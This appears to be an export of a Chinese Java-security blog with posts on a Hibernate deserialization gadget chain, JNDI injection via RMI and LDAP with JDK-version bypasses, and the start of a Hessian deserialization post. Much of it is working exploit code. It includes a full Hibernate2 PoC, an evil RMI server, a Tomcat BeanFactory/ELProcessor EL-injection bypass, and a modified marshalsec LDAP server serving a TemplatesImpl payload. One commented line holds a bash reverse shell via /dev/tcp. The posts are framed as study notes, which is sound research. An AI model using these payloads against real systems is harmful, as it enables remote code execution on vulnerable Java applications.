Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);        // TemplatesImpl 恶意字节码        JdbcRowSetImpl rs = new JdbcRowSetImpl();        rs.setDataSourceName(&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;);        Method method = JdbcRowSetImpl.class.getMethod(&quot;getDatabaseMetaData&quot;);        // 创建 BasicPropertyAccessor 实例，用来触发 TemplatesImpl 的 getOutputProperties        Class&lt;?&gt; basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);        Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);        constructor.setAccessible(true);        Object getter = constructor.newInstance(rs.getClass(), method, &quot;databaseMetaData&quot;);        // PojoComponentTuplizer 用来触发 BasicPropertyAccessor实例的 getter方法        Object tup = Reflections.createWithoutConstructor(pojoComponentTuplizerClass);        // 触发过程在其父类当中，需要其父类的 getter 数组        Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        Object getters = Array.newInstance(getter.getClass(), 1);        Array.set(getters, 0, getter);        field.set(tup, getters);        // 创建 ComponentType 实例， 用来触发 PojoComponentTuplizer 的 getPropertyValues        Object type = Reflections.createWithoutConstructor(componentTypeClass);        // 需要用到 componentTuplizer propertySpan propertyTypes 这三个属性        Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);        field1.setAccessible(true);        field1.set(type, tup);        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);        field2.setAccessible(true);        field2.set(type, 1);        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);        field3.setAccessible(true);        field3.set(type, new Type[]&#123;(Type) type&#125;);        // 创建 TypedValue 实例，用来调用 ComponentType 的 getHashCode        TypedValue typedValue = new TypedValue((Type) type, null);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(typedValue, &quot;racerz&quot;);        // put 之后再修改 typedValue 中属性 value 避免 put 时触发 gadget        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);        valueField.setAccessible(true);        valueField.set(typedValue, rs);        FileOutputStream fout = new FileOutputStream(fileName);        ObjectOutputStream outputStream = new ObjectOutputStream(fout);        outputStream.writeObject(hashMap);        FileInputStream fileInputStream = new FileInputStream(fileName);        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);        inputStream.readObject();    &#125;&#125;\n\nHibernate2其本质上和1是一样的，只不过最后getter方法换了一个sink函数\n这里利用JdbcRowSetImpl的getDatabaseMetaData方法最终构成JNDI注入\n\n调用链如下\nHashMap.readObject()    TypedValue.hashCode()        ValueHolder.getValue()            ValueHolder.DeferredInitializer().initialize()                ComponentType.getHashCode()                    PojoComponentTuplizer.getPropertyValue()                        AbstractComponentTuplizer.getPropertyValue()                          BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()                                JdbcRowSetImpl.getDatabaseMetaData()\nPOC如下\npublic static String fileName = &quot;Hibernate2.bin&quot;;    public static void main(String[] args) throws Exception &#123;        Class&lt;?&gt; componentTypeClass = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);        Class&lt;?&gt; pojoComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);        // TemplatesImpl 恶意字节码        JdbcRowSetImpl rs = new JdbcRowSetImpl();        rs.setDataSourceName(&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;);        Method method = JdbcRowSetImpl.class.getMethod(&quot;getDatabaseMetaData&quot;);        // 创建 BasicPropertyAccessor 实例，用来触发 TemplatesImpl 的 getOutputProperties        Class&lt;?&gt; basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);        Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);        constructor.setAccessible(true);        Object getter = constructor.newInstance(rs.getClass(), method, &quot;databaseMetaData&quot;);        // PojoComponentTuplizer 用来触发 BasicPropertyAccessor实例的 getter方法        Object tup = Reflections.createWithoutConstructor(pojoComponentTuplizerClass);        // 触发过程在其父类当中，需要其父类的 getter 数组        Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        Object getters = Array.newInstance(getter.getClass(), 1);        Array.set(getters, 0, getter);        field.set(tup, getters);        // 创建 ComponentType 实例， 用来触发 PojoComponentTuplizer 的 getPropertyValues        Object type = Reflections.createWithoutConstructor(componentTypeClass);        // 需要用到 componentTuplizer propertySpan propertyTypes 这三个属性        Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);        field1.setAccessible(true);        field1.set(type, tup);        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);        field2.setAccessible(true);        field2.set(type, 1);        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);        field3.setAccessible(true);        field3.set(type, new Type[]&#123;(Type) type&#125;);        // 创建 TypedValue 实例，用来调用 ComponentType 的 getHashCode        TypedValue typedValue = new TypedValue((Type) type, null);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(typedValue, &quot;racerz&quot;);        // put 之后再修改 typedValue 中属性 value 避免 put 时触发 gadget        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);        valueField.setAccessible(true);        valueField.set(typedValue, rs);        FileOutputStream fout = new FileOutputStream(fileName);        ObjectOutputStream outputStream = new ObjectOutputStream(fout);        outputStream.writeObject(hashMap);        FileInputStream fileInputStream = new FileInputStream(fileName);        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);        inputStream.readObject();    &#125;\n\n利用tabby查询\nmatch (source:Method) where source.NAME=&quot;hash&quot; and source.CLASSNAME=&quot;java.util.HashMap&quot;match (sink:Method) where sink.NAME=&quot;get&quot; and sink.CLASSNAME=&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield pathwhere any(n in nodes(path) where n.CLASSNAME=&quot;org.hibernate.engine.spi.TypedValue&quot;)return * limit 100\n\n可以看到只能查到后半截，前半截不太一致，感觉是匿名函数导致的。前半截到equals那里断掉了\n\n参考链接https://su18.org/post/ysoserial-su18-3/#hibernate1\n","tags":["JAVA安全"]},{"title":"JNDI注入浅析","url":"/2023/01/11/JNDI/","content":"写在前面最近打算系统化梳理一下JAVA安全的知识点，本节知识点为JNDI，之前看了好多篇还并不是完全明白，这次再看加深印象。并且想自己动手写一个JNDI-Exploit，锻炼自己的工程化代码能力\n什么是JNDI全称：JAVA命名和目录接口（Java Naming and Directory Interface），通过调用JNDI的API可以定位资源和其他程序对象。现有可访问的目录和服务有JDBC LDAP RMI DNS NIS CORBA\n命名 =&gt; Naming Service命名服务主要是将名称和对象相关联，这里的对象并不是实体，而是对象的引用，其中包含着如何去访问对象的信息。\n名称系统的几个重要概念\n\nBindings: 表示一个名称和对应对象的绑定关系Context:一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象References: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。\n\n目录 =&gt; Directory Service目录服务是命名服务的扩展，它允许对象还可以具有属性。提供在目录中进行CRUD对象操作\n由此，我们可以通过两种方式使用JNDI：\n\n常规方式使用名称服务\n使用目录服务作为对象存储的系统，即用目录服务来存储和获取Java对象\n\n我们可以通过统一的API来访问不同的目录服务实现，架构如下：\n其中的API分为应用层接口和SPI\n\n\nSPI 全称为 Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装\n\n一些需要的类\nInitialContext\n构造方法：\n//构建一个初始上下文。InitialContext() //构造一个初始上下文，并选择不初始化它。InitialContext(boolean lazy) //使用提供的环境构建初始上下文。InitialContext(Hashtable&lt;?,?&gt; environment) \n常用方法：\n//将名称绑定到对象。 bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。list(String name) //检索命名对象。lookup(String name)  //将名称绑定到对象，覆盖任何现有绑定。rebind(String name, Object obj) //取消绑定命名对象。unbind(String name)  \n\nReference\n对象的引用类\n构造方法\n//为类名为“className”的对象构造一个新的引用。Reference(String className) //为类名为“className”的对象和地址构造一个新引用。 Reference(String className, RefAddr addr) //为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 Reference(String className, RefAddr addr, String factory, String factoryLocation) //为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  Reference(String className, String factory, String factoryLocation)/*参数：className 远程加载时所使用的类名factory  加载的class中需要实例化类的名称factoryLocation  提供classes数据的地址可以是file/ftp/http协议*/\n常用方法：\n//将地址添加到索引posn的地址列表中。void add(int posn, RefAddr addr) //将地址添加到地址列表的末尾。 void add(RefAddr addr) //从此引用中删除所有地址。  void clear() //检索索引posn上的地址。 RefAddr get(int posn) //检索地址类型为“addrType”的第一个地址。  RefAddr get(String addrType) //检索本参考文献中地址的列举。 Enumeration&lt;RefAddr&gt; getAll() //检索引用引用的对象的类名。 String getClassName() //检索此引用引用的对象的工厂位置。  String getFactoryClassLocation() //检索此引用引用对象的工厂的类名。  String getFactoryClassName() //从地址列表中删除索引posn上的地址。    Object remove(int posn) //检索此引用中的地址数。 int size() //生成此引用的字符串表示形式。String toString() \n\n\nJNDI Reference 注入  前因：为了避免每次在命名服务绑定Java对象时都需要序列化大数据并传输，因此改为换成对象引用的方式。\n\n对象就可以通过绑定一个可以被命名管理器(Naming Manager)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。\n\n  引用由Reference来表示，里面包括一个RefAddress地址有序列表和所引用的对象信息，包括类名、创建对象的ObjectFactory类的名称和地址\n\n\nReference可以使用ObjectFactory来构造对象。当使用lookup()方法查找对象时，Reference将使用提供的ObjectFactory类的加载地址来加载ObjectFactory类，ObjectFactory类将构造出需要的对象。\n\n  这也是JNDI的利用原理，当lookup参数可控时，便可向指定位置加载恶意对象\n  具体流程如下，这里以RMI服务为例\n  首先服务端绑定引用到注册中心，并且该引用对象中工厂类位置为恶意class所在位置\n  Reference reference = new Reference(&quot;Exploit&quot;,&quot;Exploit&quot;,&quot;http://evilHost/&quot; );     registry.bind(&quot;Exploit&quot;, new ReferenceWrapper(reference));\n  客户端通过rmi协议发起请求，即可造成恶意文件，实例化类时造成RCE\n  Context ctx = new InitialContext();ctx.lookup(&quot;rmi://evilHost/Exploit&quot;);\nJNDI-RMI\n低版本JDK\nEvil Server 顺便练了一下javassit生成字节码\npublic class EvilServer &#123;    public static void main(String[] args) throws Exception &#123;        makeEvilClass();        Registry registry = LocateRegistry.createRegistry(1099);        String factoryUrl = &quot;http://localhost:1098/&quot;;        Reference reference = new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, factoryUrl);        ReferenceWrapper wrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Foo&quot;, wrapper);        System.out.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl);    &#125;    public static void makeEvilClass() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass cc = pool.makeClass(&quot;EvilClass&quot;);        cc.setInterfaces(new CtClass[]&#123; pool.get(&quot;javax.naming.spi.ObjectFactory&quot;) &#125;);        String code = &quot;&#123;try&#123;System.out.println(\\&quot;EvilClass: \\&quot; + $1);&#125; catch(Exception e)&#123;&#125;&#125;&quot;;        CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;log&quot;, new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;, cc);        ctMethod.setModifiers(Modifier.STATIC);        ctMethod.setBody(code);        cc.addMethod(ctMethod);        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);        cons.setBody(&quot;&#123;EvilClass.log(\\&quot;constructor\\&quot;);&#125;&quot;);        cc.addConstructor(cons);        CtConstructor staticCode = cc.makeClassInitializer();        staticCode.setBody(&quot;&#123;EvilClass.log(\\&quot;static block\\&quot;);&#125;&quot;);        CtClass returnType = pool.get(&quot;java.lang.Object&quot;);        CtClass[] parameters = &#123;pool.get(&quot;java.lang.Object&quot;), pool.get(&quot;javax.naming.Name&quot;), pool.get(&quot;javax.naming.Context&quot;)&#125;;        CtMethod ctMethod1 = new CtMethod(returnType, &quot;getObjectInstance&quot;, parameters, cc);        ctMethod1.addParameter(pool.get(&quot;java.util.Hashtable&quot;));        ctMethod1.setBody(&quot;&#123;EvilClass.log(\\&quot;getObjectInstance\\&quot;); return null;&#125;&quot;);        cc.addMethod(ctMethod1);        cc.writeFile(&quot;D:\\\\ctf\\\\JNDI\\\\src\\\\main\\\\java\\\\&quot;);    &#125;&#125;\n生成的class文件如下\n\n\n\nClient：\npublic class Client &#123;    public static void main(String[] args) &#123;        try &#123;            Object ret = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/Foo&quot;);            System.out.println(&quot;ret&quot; + ret);        &#125;catch (NamingException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n服务端启动恶意服务器，客户端运行\n\n各个代码块执行顺序：\n\nstatic在类加载的时候执行代码块和无参构造方法在clas.newInstance()时执行\n\n\n高版本JDK限制\nJDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false\n如果想要直接运行，如要添加参数\n-D com.sun.jndi.rmi.object.trustURLCodebase=true\n看下报错：\n\n可以看到在com.sun.jndi.rmi.registry.RegistryContext#decodeObject方法中，由于高版本trustURLCodebase默认为false，进入分支抛出异常\n\n\n高版本JDK绕过\n绕过方式可以针对条件句的三个子句尝试进行利用\n\n令var8也就是ref为空，需要让其既不是Reference类也不是Referenceable类，那么就只能直接用原始对象了，在RMI下不好利用\n\n\n令ref.getFactoryClassLocation()返回空值，也就是设置ref的classFactoryLocation属性为空，客户端不再从远程加载class字节码\n\n第三项就是正常设置参数\n\n\n如果按照第二个思路来的话，下一个执行为NamingManager.getObjectInstance()，我们跟进。\n这里会发现，如果ref不为空的话，先获取到工厂类名然后会直接尝试实例化工厂类，如果不为null将会进一步调用工厂类的getObjectInstance()方法\n\n按照之前实验的客户端在lookup后的代码块执行顺序，我们只要能在这几个地方其中一个触发payload就行了\n调用栈如下：\nInitialContext#lookup()  RegistryContext#lookup()    RegistryContext#decodeObject()      NamingManager#getObjectInstance()          objectfactory = NamingManager#getObjectFactoryFromReference()                  Class#newInstance()  //--&gt;恶意代码被执行     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行\n条件：\n\n\n存在于目标本地的 CLASSPATH 中 \n\n实现 javax.naming.spi.ObjectFactory 接口 \n\n至少存在一个 getObjectInstance() 方法\n\n\n利用：Tomcat内置类\n依赖\n&lt;dependency&gt;          &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;          &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;          &lt;version&gt;8.5.15&lt;/version&gt;      &lt;/dependency&gt;\n看下 org.apache.naming.factory.BeanFactory#getObjectInstance()\npublic Object getObjectInstance(Object obj, Name name, Context nameCtx,                                Hashtable&lt;?,?&gt; environment)    throws NamingException &#123;    Reference ref = (Reference) obj;    String beanClassName = ref.getClassName();    ClassLoader tcl = Thread.currentThread().getContextClassLoader();    // 1. 反射获取类对象    if (tcl != null) &#123;        beanClass = tcl.loadClass(beanClassName);    &#125; else &#123;        beanClass = Class.forName(beanClassName);    &#125;    // 2. 初始化类实例    Object bean = beanClass.getConstructor().newInstance();    // 3. 根据 Reference 的属性查找 setter 方法的别名    RefAddr ra = ref.get(&quot;forceString&quot;);    String value = (String)ra.getContent();    // 4. 循环解析别名并保存到字典中    for (String param: value.split(&quot;,&quot;)) &#123;        param = param.trim();        index = param.indexOf(&#x27;=&#x27;);        if (index &gt;= 0) &#123;            setterName = param.substring(index + 1).trim();            param = param.substring(0, index).trim();        &#125; else &#123;            setterName = &quot;set&quot; +                param.substring(0, 1).toUpperCase(Locale.ENGLISH) +                param.substring(1);        &#125;        forced.put(param, beanClass.getMethod(setterName, paramTypes));    &#125;    // 5. 解析所有属性，并根据别名去调用 setter 方法    Enumeration&lt;RefAddr&gt; e = ref.getAll();    while (e.hasMoreElements()) &#123;        ra = e.nextElement();        String propName = ra.getType();        String value = (String)ra.getContent();        Object[] valueArray = new Object[1];        Method method = forced.get(propName);        if (method != null) &#123;            valueArray[0] = value;            method.invoke(bean, valueArray);        &#125;        // ...    &#125;&#125;\n 这里首先会通过反射实例化类，但注意调用的是无参构造方法。接着获取forceString所有的引用地址，并通过逗号分隔，每个分隔值中如果出现等号，则将逗号右侧的值作为setter方法的别名，左侧作为参数引用。之后会将其放入forced这个map当中。后续会调用所有的setter方法，参数为RefAddr的值（单参数），如此我们可以构造来实例化任意类并调用任意方法，只需满足该类含有无参构造函数以及可利用方法为单个参数传递\n\njavax.el.ELProcessor#eval() 可以通过eval方法执行EL表达式\n\n因此整个绕过流程，首先ref.getFactoryClassLocation()需要为空，也就是在设置引用类是设置属性factoryClassLocation为空即可；接着在NamingManager.getObjectInstance()成功实例化了本地存在的工厂类org.apache.naming.factory.BeanFactory，后者通过newInstance调用目标类的无参构造创建实例，并通过预设值的setter别名机制调用到javax.el.ELProcessor#eval()从而出发最终的EL表达式注入\nPOC构造\n这里的引用类利用了ResourceRef，它是tomcat中对某个资源的引用，构造函数如下\n\npublic static void main(String args[]) &#123;        try &#123;            Registry registry = LocateRegistry.createRegistry(1099);            ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);            ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));            // ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\\&quot;)&quot;));            ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;)&quot;));            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);            registry.bind(&quot;calc&quot;, referenceWrapper);            System.err.println(&quot;Server ready&quot;);        &#125; catch (Exception e) &#123;            System.err.println(&quot;Server exception: &quot; + e.toString());            e.printStackTrace();        &#125;    &#125;\n这里x即引用到的参数，其值即为javax.el.ELProcessor#eval()要执行的参数内容\n\n\ngroovy 这个类之后再看\n\n\n绕过总结：\n\n\nServer:\n使用ResourceRef构造的beanClass，这种利用方式构造的beanClass是javax.el.ELProcessor。ELProcessor中有个eval(String)方法可以执行EL表达式,javax.el.ELProcessor是Tomcat8中的库，所以仅限Tomcat8及更高版本环境下可以通过该库进行攻击。\n\nClient:\n远程 RMI 服务器返回的 Reference 对象中不指定 Factory 的 codebase，且使用本地的factory，如BeanFactory，以此绕过 trustURLCodebase 报错，执行 NamingManager ；在factory的静态代码块、代码块、构造函数和getObjectInstance方法任意一个里面构造payload，即可在 NamingManager 中执行。\n\n\n\n工具：\n\nhttps://github.com/welk1n/JNDI-Injection-Bypass\nhttps://github.com/mbechler/marshalsec\n\n\n\nJNDI_LDAPLDAP服务是一种树型数据库，其中存在特殊的属性可以用来实现Java对象以序列化数据或者引用的方式来存储，这时如果被客户端解析的话，就可以引起远程代码执行\n\n低版本JDK运行\n工具利用marshalsec开启ldap服务\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\\#EvilClass 8088\n\n由于LDAP服务的Reference远程加载Factory类并不是使用的RMI Class Loader机制，因此不受trustURLCodebase限制（8u191）\n恶意类放在服务器下\n\n低版本结果\n\n高版本结果\n\n\n调用流程分析\n前面的调用栈与RMI类似，lookup之后decodeObject\ndecodeObject:235, Obj (com.sun.jndi.ldap)c_lookup:1051, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)main:7, Client\n跟进com.sun.jndi.ldap.Obj.java#decodeObject()，该方法会对服务端传来的数据根据不同的类型进行解码处理，类型可以是序列化数据或者引用对象，这里以引用对象为例\n\n\n\n之后会调用decodeReference()方法，其会获取服务端传来的属性值并构建一个Reference实例\n这里便\n\n接着会返回到c_lookup类中执行DirectoryManager#getObjectInstance() 其中var3为构建的引用类对象\n\n这里可以看到首先将参数refInfo强转为Reference类实例，接着调用getFactoryClassName获取工厂类名，然后通过getObjectFactoryFromReference()方法根据工厂类名获取远程调用类。我们看下这里的具体实现\n\n其首先会从本地加载目标类，如果找不到的话再通过制定的工厂类位置来远程加载。整个过程没有URLCodebase限制\n\n\n高版本限制\n\n在高版本 JDK 中需要通过 com.sun.jndi.ldap.object.trustURLCodebase 选项去启用。这个限制在 JDK 11.0.1、8u191、7u201、6u211 版本时加入，略晚于 RMI 的远程加载限制。\n\n限制位置加载了helper.loadClass()，也就是VersionHelper12#loadClass()中\n\n\n其他几种利用方式\n使用序列化数据触发Gadget\n在com.sun.jndi.ldap.Obj.java#decodeObject()中通过JAVA_ATTRIBUTES[SERIALIZED_DATA]检测服务端传来的是否为序列化数据，进而调用deserializeObject()方法\n\n\n\n跟进可以看到存在原生反序列化readObject()\n\n改造marchalsec服务端程序的sendResult()部分即可，我这里的序列化数据以CC2为例\npublic class LDAPRefServer1 &#123;    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;    public static void main ( String[] args ) &#123;        int port = 8088;        try &#123;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;, //$NON-NLS-1$                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new LDAPRefServer1.OperationInterceptor(new URL(args[ 0 ])));            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        /**         *         */        public OperationInterceptor ( URL cb ) &#123;            this.codebase = cb;        &#125;        /**         * &#123;@inheritDoc&#125;         *         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */        @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            try &#123;                sendResult(result, base, e);            &#125;            catch ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        public static Object getPayload() throws Exception &#123;            String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;            String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;            // 恶意字节码部分构造            ClassPool classPool = ClassPool.getDefault();            classPool.appendClassPath(AbstractTranslet);            CtClass poc = classPool.makeClass(&quot;POC&quot;);            poc.setSuperclass(classPool.get(AbstractTranslet));            poc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);            byte[] evilCode = poc.toBytecode();            // TemplatesImpl 恶意加载类构造 sink            Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();            Field field = templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);            field.setAccessible(true);            field.set(templatesImpl, new byte[][]&#123;evilCode&#125;);            Field field1 = templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);            field1.setAccessible(true);            field1.set(templatesImpl, &quot;whatever&quot;);            // 构造gadget来连接 TemplatesImpl#newTransformer            InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);            TransformingComparator comparator = new TransformingComparator(transformer);            // 连接compare方法            PriorityQueue queue = new PriorityQueue(2);            queue.add(1);            queue.add(2);            Field field2 = queue.getClass().getDeclaredField(&quot;comparator&quot;);            field2.setAccessible(true);            field2.set(queue, comparator);            Field field3 = queue.getClass().getDeclaredField(&quot;queue&quot;);            field3.setAccessible(true);            field3.set(queue, new Object[]&#123;templatesImpl, templatesImpl&#125;);            return queue;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaSerializedData&quot;, new Java().marshal(getPayload()));            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;\n触发点2：第一种改造\n关注com.sun.jndi.ldap.Obj.java#decodeReference()方法，其在重构Reference对象的基础之上，如果存在javaReferenceAddress属性还会继续构建该属性，满足特定条件可以也触发deserializeObject()方法\n\n源码细节见：http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/ldap/Obj.java\n需要满足的条件如下：\n\n第一个符号为分隔符\n第一个分隔符和第二个分隔符之间，表示Reference的position，需要是整数类型\n第二个分隔符到第三个分隔符之间，表示type\n第三个分隔符为双分隔符，用于表示为内容，之后的内容为序列化数据\n序列化数据需要Base64编码\n\nprotected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);            e.addAttribute(&quot;javaReferenceAddress&quot;, &quot;$1$String$$&quot;+new Base64Encoder().encode(new Java().marshal(getPayload())));            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;\n\nJNDI-RMI注入方式有：\n\ncodebase(JDK 6u132、7u122、8u113之前可以) \n利用本地Class Factory作为Reference Factory\n\nJNDI-LDAP注入方式： \n\ncodebase(JDK 11.0.1、8u191、7u201、6u211之前可以) \nserialize（两个切入点）\n\n\n工具化利用这里参考su18师傅和 welk1n 师傅的工具造个轮子，锻炼一下自己的工程化开发能力\n之后新开一帖\n参考链接\nhttps://github.com/su18/JNDI\nhttps://github.com/mbechler/marshalsec\nhttps://github.com/welk1n/JNDI-Injection-Exploit/\nhttps://tttang.com/archive/1611/\n\n","tags":["JAVA安全"]},{"title":"Hessian 反序列化浅析","url":"/2023/03/25/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","content":"Hessian 反序列化学习\n简单了解下 Hessian \nHessian 是一种动态类型、二进制序列化和 Web 服务协议，旨在用于面向对象的传输。\n「Hessian」的简单使用：\n\n基于 servlet：\n\n配置 server 端\n只需要继承 HessianServlet 即可\npublic class HelloServlet extends HessianServlet implements Greeting &#123;    @Override    public String sayHello(HashMap o) &#123;        return &quot;hello&quot; + o.toString();    &#125;&#125;\nweb.xml 如下:\n&lt;servlet&gt;        &lt;servlet-name&gt;helloServlet&lt;/servlet-name&gt;        &lt;servlet-class&gt;HelloServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;        &lt;servlet-mapping&gt;        &lt;servlet-name&gt;helloServlet&lt;/servlet-name&gt;        &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;\n\n配置客户端：\npublic static void main(String[] args) throws Exception &#123;        String url = &quot;http://localhost:8080/hello&quot;;        HessianProxyFactory factory = new HessianProxyFactory();        Greeting greeting = (Greeting) factory.create(Greeting.class, url);        HashMap o = new HashMap&lt;&gt;();        o.put(&quot;a&quot;, &quot;a&quot;);        System.out.println(&quot;Hessian Call: &quot; + greeting.sayHello(o));    &#125;\n\n\n\n\n基于 spring 项目\n\n\n\n\n源码分析：\n\nServlet 部分\nHessianServlet 继承自 HttpServlet 实现了 init 和 service 等方法\ninit 部分对成员变量进行的初始化操作\n\n其中在进行类加载时采用的自定义 loadClass 方法\n\n这里使用自定义类加载机制的原因：\n\n\n不同环境下可能使用自定义类加载器重新加载类，对原来的代码进行魔改，这里可以确保拿到原本的代码。\n线程中一般默认是 AppClassLoader，是加载用户代码的类加载器，通常可以很快找到用户的类。\n\n\nservice 部分处理逻辑：\n\n\n请求仅支持 POST 方法，否则返回 500\n获取请求中的 id 或 ejbid 参数并赋值给 objectId\n设置响应体的 contentType\ninvoke 